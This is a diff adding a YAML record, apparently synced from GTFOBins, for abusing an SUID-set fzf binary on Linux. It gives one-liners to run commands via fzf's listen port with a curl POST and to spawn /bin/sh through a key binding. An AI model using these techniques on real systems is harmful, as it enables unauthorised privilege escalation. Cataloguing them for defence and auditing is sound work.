@@ -1,0 +1,102 @@
+id: gtfobins/fzf/command/suid
+type: binary
+platform: linux
+name: fzf
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: fzf --listen=12345
+  comment: 'Commands can be issued via POST requests, for example:
+
+
+    ```
+
+    curl http://localhost:12345 -d ''execute(/path/to/command)''
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/fzf/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        fzf:
+          functions:
+            command:
+            - code: fzf --listen=12345
+              comment: 'Commands can be issued via POST requests, for example:
+
+
+                ```
+
+                curl http://localhost:12345 -d ''execute(/path/to/command)''
+
+                ```'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            shell:
+            - code: fzf --bind 'enter:execute(/bin/sh)'
+              comment: Press `Enter` to receive the shell.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/fzf/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:70c092c9dc766434843f55689297861efc113ea02347470026d7f3dbc1ca43d2
